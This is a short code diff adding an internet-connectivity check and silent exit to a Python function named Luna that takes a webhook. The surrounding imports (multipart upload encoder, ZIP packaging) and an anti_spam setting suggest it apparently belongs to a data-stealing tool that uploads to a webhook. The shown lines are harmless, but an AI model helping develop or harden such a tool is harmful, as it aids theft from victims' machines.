@@ -3,6 +3,7 @@ import json
 import os
 import random
 import requests
+import sys
 from multiprocessing import cpu_count
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from zipfile import ZIP_DEFLATED, ZipFile
@@ -81,6 +82,14 @@ def main(webhook: str):
 
 
 def Luna(webhook: str):
+	def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
+		try:
+			return requests.get("https://gstatic.com/generate_204").status_code == 204
+		except Exception:
+			return False
+	if not IsConnectedToInternet():
+		sys.exit(0)
+
 	if __CONFIG__["anti_spam"]:
 		AntiSpam()
 
